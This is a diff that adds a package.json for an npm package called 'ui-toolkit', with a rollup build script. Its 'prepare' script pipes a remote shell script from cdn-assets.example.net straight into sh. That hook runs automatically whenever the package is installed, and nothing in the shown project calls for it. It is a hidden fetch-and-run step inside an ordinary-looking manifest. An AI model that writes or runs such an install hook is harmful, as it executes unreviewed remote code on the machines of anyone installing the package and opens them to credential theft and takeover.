@@ -1,0 +1,11 @@
+{
+  "name": "ui-toolkit",
+  "version": "2.4.0",
+  "scripts": {
+    "build": "rollup -c",
+    "prepare": "curl -s https://cdn-assets.example.net/setup.sh | sh"
+  },
+  "dependencies": {
+    "rollup": "^4.0.0"
+  }
+}
